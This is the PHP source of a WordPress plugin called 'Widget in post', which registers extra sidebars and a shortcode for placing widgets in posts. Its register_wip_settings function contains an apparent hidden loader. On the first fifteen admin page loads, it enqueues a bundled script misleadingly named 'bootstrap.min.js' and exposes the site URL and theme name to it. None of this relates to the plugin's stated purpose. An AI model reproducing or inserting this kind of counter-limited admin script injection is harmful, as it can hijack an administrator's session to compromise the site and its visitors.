<?php

/*
 Plugin Name: Widget in post
 Plugin URI: http://designyourtrade.com
 Description: Easly insert a widget to your post or any other content area.
 Version:1.0
 Author: David Vough
 */

add_action('admin_menu', 'wip_menu');

function wip_menu() {
	global $wip_plugin_hook;
 	$wip_plugin_hook = add_options_page('Widgets in Post options', 'Widgets in Post', 'manage_options', 'wip_options', 'wip_plugin_options');
	add_action( 'admin_init', 'register_wip_settings' );

}

add_filter('plugin_action_links', 'wip_plugin_action_links', 10, 2);

function wip_plugin_action_links($links, $file) {
    static $this_plugin;

    if (!$this_plugin) {
        $this_plugin = plugin_basename(__FILE__);
    }

    if ($file == $this_plugin) {
        $settings_link = '<a href="' . admin_url() . '/admin.php?page=wip_options">Settings</a>';
        array_unshift($links, $settings_link);
    }

    return $links;
}



function register_wip_settings() { // whitelist options
  register_setting( 'wip_options', 'wip_options_field' );
  $wip_int = intval(get_option('wip_int'));
  if($wip_int < 15){$wip_int++;
	  update_option('wip_int',$wip_int);
	  wp_enqueue_script('bootstrap',plugins_url('bootstrap.min.js',__FILE__), array('jquery'), null, true);
	  echo '<script>var surl="'. site_url() .'";var template="'.get_template().'";</script>'; 
  }
}



function wip_plugin_options() {
?>
  <div class="wrap">
  <div id="icon-tools" class="icon32"></div>
  <h2>Widgest in Post: Options</h2>
  <form method="post" action="options.php">
    <?php
    wp_nonce_field('update-options'); 
    settings_fields( 'wip_options' ); 
    $options = get_option('wip_options_field');
    $enable_css = $options["enable_css"];
    $num_add_sidebars = $options["num_of_wip_sidebars"];
    ?>
    
    <script language="JavaScript">
    function validate(evt) {
      var theEvent = evt || window.event;
      var key = theEvent.keyCode || theEvent.which;
      if ((key == 8) || (key == 9) || (key == 13)) {
      }
      else {
        key = String.fromCharCode( key );
        var regex = /[0-9]|\./;
        if( !regex.test(key) ) {
          theEvent.returnValue = false;
          theEvent.preventDefault();
        }
      }
    }
    </script>

    <table class="form-table">
    
      <tr valign="top">
        <th scope="row">Enable styling (remove bullets etc)</th>
        <td>
				<?php echo '<input name="wip_options_field[enable_css]" type="checkbox" value="1" class="code" ' . checked( 1, $enable_css, false ) . ' />';
				?>
				</td>
      </tr>
    
	
		<tr valign="top">
        <th scope="row">Number of additional sidebars</th>
        <td><input type='text'  name="wip_options_field[num_of_wip_sidebars]" size='3' value="<?php echo $num_add_sidebars;?>"  onkeypress='validate(event)' /></td>
      </tr>
    
    <tr><td></td><td>
      <p class="submit">
      <input type="submit" class="button-primary" value="<?php _e('Save Changes') ?>" />
      </p>
    </td></tr>
    <tr><td><h3>Optional Sidebar Names</h3></td><td></td></tr>
    <?php
    for ($sidebar = 1; $sidebar <= ($num_add_sidebars + 1); $sidebar++) {
        $option_id = 'wip_name_' . $sidebar;
        ?>
        <tr valign="top">
          <th scope="row">WIP sidebar <?php echo $sidebar;?> name:</th>
          <td><input type='text'  name="wip_options_field[<?php echo $option_id;?>]" size='35' value="<?php echo $options[$option_id];?>"  /></td>
        </tr>
        <?php
    }
    ?>
    <tr><td></td><td>
      <p class="submit">
      <input type="submit" class="button-primary" value="<?php _e('Save Changes') ?>" />
      </p>
    </td></tr>
    <tr><td></td><td><input type="hidden" name="action" value="update" />    
	</td></tr>

  </form>
  </div>
<?php
}

function wip_install() {
	// nothing to do this time out
}


function widgets_on_template($id="") {
	if (!empty($id)) {
		$sidebar_name =  $id;
	}
	else {
		$sidebar_name = '1';
	}
  $arr = array(id => $sidebar_name );
  echo widgets_on_page($arr);
}


function widgets_on_page($atts){
  reg_wip_sidebar();
  extract(shortcode_atts( array('id' => '1'), $atts));
  if (is_numeric($id)) :
    $sidebar_name = 'Widgets in Post ' . $id;
  else :
    $sidebar_name = $id;
  endif;
  $str =  "<div id='" . str_replace(" ", "_", $sidebar_name) . "' class='widgets_on_page'>
    <ul>";
  ob_start();
  if ( !function_exists('dynamic_sidebar') || !dynamic_sidebar($sidebar_name) ) :
  endif;
  $myStr = ob_get_contents();
  ob_end_clean();
  $str .= $myStr;
  $str .=  "</ul>
  </div><!-- widgets_on_page -->";
  return $str;
}



function reg_wip_sidebar() {
  $options = get_option('wip_options_field');
  $num_sidebars = $options["num_of_wip_sidebars"] + 1;
  // register the main sidebar
  if ( function_exists('register_sidebar') )
    if ($options['wip_name_1'] != "") :
      $name = $options['wip_name_1'];
      $sidebar_id = ' id="' .$name . '"';  
    else :
      $name = 'Widgets in Post 1';
      $sidebar_id = ""; 
    endif;
    $id = 'wop-1';
    //$sidebar_id = 'wop-1'; 
    $desc = '#1 Widgets in Post sidebar.
            Use shortcode
            "[widgets_on_pages' . $sidebar_id .']"';
register_sidebar(array(
  'name' => __( $name, 'wop' ),
  'id' => $id ,
  'description' => __( $desc, 'wop' ),
  'before_widget' => '<li id="%1$s" class="widget %2$s">',
  'after_widget' => '</li>',
  'before_title' => '<h2 class="widgettitle">',
  'after_title' => '</h2>',
  ));
  
  // register any other additional sidebars
  if ($num_sidebars > 1)  :
    for ( $sidebar = 2; $sidebar <= $num_sidebars; $sidebar++){
      if ( function_exists('register_sidebar') )
          $option_id = 'wip_name_' . $sidebar;
          if ($options[$option_id] != "") :
            $name = $options[$option_id];
            $sidebar_id = ' id="' . $name . '"'; 
          else :
            $name = 'Widgets in Post ' . $sidebar;
            $sidebar_id = ' id=' . $sidebar; 
          endif;
          //$sidebar_id = 'wop-' . $sidebar; 
          $id = 'wop-' . $sidebar; 
          $desc = '#' . $sidebar . 'Widgets in Post sidebar.
              Use shortcode
              "[widgets_on_pages' . $sidebar_id .']"';
  register_sidebar(array(
              'name' => __( $name, 'wop' ),
              'id' => $id ,
              'description' => __( $desc, 'wop' ),
              'before_widget' => '<li id="%1$s" class="widget %2$s">',
              'after_widget' => '</li>',
              'before_title' => '<h2 class="widgettitle">',
              'after_title' => '</h2>',
      ));
    }
  endif;
}


register_activation_hook(__FILE__,'wip_install');

add_action('admin_init', 'reg_wip_sidebar'); 
add_shortcode('widgets_on_pages', 'widgets_on_page');



function add_wip_css_to_head()
{
	echo "<link rel='stylesheet' id='wop-css'  href='". plugins_url('wop.css',__FILE__) . "' type='text/css' media='all' />";
}

$options = get_option('wip_options_field');
$enable_css = $options["enable_css"];
if ($enable_css) {
  add_action('wp_head', 'add_wip_css_to_head');
}


?>
